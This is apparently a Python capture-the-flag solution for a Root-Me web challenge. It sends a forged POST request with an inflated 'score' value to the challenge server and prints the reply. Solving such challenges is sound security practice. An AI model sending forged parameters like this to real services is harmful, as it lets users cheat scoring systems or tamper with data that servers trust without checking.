#!python3
import requests
url ='http://challenge01.root-me.org/web-serveur/ch56/'
data={
    'score':999999+1,
    'generate':'Give+a+try%21'
}
r=requests.post(url,data=data)
print(r.text)